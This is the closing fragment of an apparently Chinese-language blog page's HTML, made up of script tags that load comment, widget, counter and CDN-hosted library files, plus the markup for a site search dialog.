    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script defer src="/live2d-widget-master/autoload.js"></script><script src="/js/lunar.js"></script><script src="/js/day.js"></script><script type="text/javascript" src="/js/FunnyTitle.js"></script><script type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script src="/js/jquery.js"></script><script type="text/javascript" src="/js/click.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/cat.js"></script><script defer src="/js/runtime.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>